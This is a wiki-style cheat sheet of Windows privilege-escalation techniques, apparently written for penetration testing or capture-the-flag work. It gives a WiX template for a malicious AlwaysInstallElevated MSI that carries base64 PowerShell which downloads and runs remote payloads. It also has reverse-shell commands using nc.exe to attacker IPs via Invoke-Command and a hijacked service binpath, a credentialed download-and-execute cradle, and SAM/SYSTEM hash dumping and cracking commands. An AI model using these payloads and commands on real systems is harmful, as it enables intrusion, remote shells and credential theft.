---
title: "Windows"
date: 2025-10-03
draft: false
type: wiki
---

# Always Install Elevated

If we have enabled a privilege which allow us to ALWAYS install with elevated privileges, we can craft a .msi leveranging wixt
ools, specifically with candl.exe and light.exe.
The steps are as follows:

1 - Create a malicious .xml wix file:

```texinfo
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name" Version="0.0.1" Manufacture
r="@_xpn_" Language="1033">
        <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
        <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
        <Directory Id="TARGETDIR" Name="SourceDir">
            <Directory Id="ProgramFilesFolder">
                <Directory Id="INSTALLLOCATION" Name="Example">
                 <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
                    </Component>
                </Directory>
            </Directory>
        </Directory>
        <Feature Id="DefaultFeature" Level="1">
            <ComponentRef Id="ApplicationFiles"/>
        </Feature>
        <CustomAction Id="SystemShell" Directory="TARGETDIR" ExeCommand="C:\Windows\System32\WindowsPowerShell\v1.0\powershell
.exe -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnAC
gAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA5ADIALwBuAGkAZQByAGkALgBwAHMAMQAnACkAOwBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBj
AHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOA
AuADQAOQAuADkAMgAvAHIAdQBuAC0AcwBoAGUAbABsAGMAbwBkAGUALQA2ADQAYgBpAHQALgBwAHMAMQAtAGYAcgBvAG0AOQAyAC0AOAAwADgAMQBwAG8AcgB0ACcA
KQAKAA==" Execute="deferred" Impersonate="no" Return="ignore"/>
        <InstallExecuteSequence>
            <Custom Action="SystemShell" After="InstallInitialize"></Custom>
        </InstallExecuteSequence>
    </Product>
</Wix>
```

The powershell in b64 executed is this one:

```powershell
IEX(New-Object Net.Webclient).downloadString('http://attacker/nieri.ps1');IEX(New-Object Net.Webclient).downloadString('http://attacker/run-shellcode-64bit.ps1')
```

2 - Create a malicious .wix (this step and next one MUST be run from the path where the wix tools are located)

```texinfo
candle.exe ..\bad-wix-pe.xml -out ..\reverse.wix
```

3 - Create the malicious .msi from the .wix

```texinfo
light.exe ..\reverse.wix -out ..\vamosvamos.msi
```

-----------------------------

# Run-As

```console
PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\> $username = "<domain>\<user>"
PS C:\> $password = '<password>'
PS C:\> $secstr = New-Object -TypeName System.Security.SecureString
PS C:\> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\> Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<ip/host>:<port>/path/to/file.evil') } -Credential $cred -Computer localhost
-----------------------------------------------------------------------------------------------------
Invoke-Command -ComputerName localhost -Creadential $credential -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.4 1338 -e cmd.exe }
```

-----------------------------

# Incorrect permisions in services (sc config binpath)

Binpath is set as running `cmd.exe` passing a commad to execute to it (so once the process dies, the one executed by it so the command to `cmd.exe` remains):

```console
sc config upnphost binpath= "C:\WINDOWS\System32\cmd.exe /k C:\inetpub\wwwroot\nc.exe -nv 192.168.42.42 443 -e C:\WINDOWS\System32\cmd.exe"
```

-----------------------------

# SAM + SYSTEM + Security

If those 3 files are in your hands (you could download to your attacker machine), you can dump hashes and crack them:

```console
/usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.bak -security SECURITY.bak -system SYSTEM.bak LOCAL

sudo john dumped_hashes --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

-----------------------------
